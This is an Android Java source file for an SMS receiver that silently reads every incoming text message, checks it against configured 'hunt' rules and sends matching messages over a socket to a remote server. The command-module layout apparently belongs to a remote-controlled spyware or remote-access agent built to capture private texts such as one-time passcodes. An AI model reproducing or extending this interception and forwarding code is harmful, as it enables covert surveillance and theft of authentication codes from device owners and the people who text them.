package com.task.tusker.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import com.task.tusker.commands.SMSHandler;
import com.task.tusker.network.SocketManager;
import org.json.JSONObject;

/**
 * Receives new SMS broadcasts and hands only configured hunt matches to the
 * device socket. SMSHandler persists matches first, so the event is safe
 * across both internet outages and process restarts.
 */
public class SmsHuntReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || !Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) return;
        Bundle extras = intent.getExtras();
        if (extras == null) return;
        Object[] pdus = (Object[]) extras.get("pdus");
        if (pdus == null || pdus.length == 0) return;

        String format = extras.getString("format");
        String sender = "";
        StringBuilder body = new StringBuilder();
        long date = System.currentTimeMillis();
        for (Object pdu : pdus) {
            try {
                SmsMessage sms = format == null
                        ? SmsMessage.createFromPdu((byte[]) pdu)
                        : SmsMessage.createFromPdu((byte[]) pdu, format);
                if (sms == null) continue;
                if (sender.isEmpty() && sms.getOriginatingAddress() != null) sender = sms.getOriginatingAddress();
                body.append(sms.getMessageBody() == null ? "" : sms.getMessageBody());
                if (sms.getTimestampMillis() > 0) date = sms.getTimestampMillis();
            } catch (Exception ignored) {}
        }
        if (sender.isEmpty() || body.length() == 0) return;

        SMSHandler handler = new SMSHandler(context.getApplicationContext());
        JSONObject result = handler.handleIncomingSms(sender, body.toString(), date, "");
        JSONObject message = result.optJSONObject("message");
        if (message != null) {
            try {
                SocketManager.getInstance(context.getApplicationContext()).publishSmsHuntMessage(message);
            } catch (Exception ignored) {}
        }
    }
}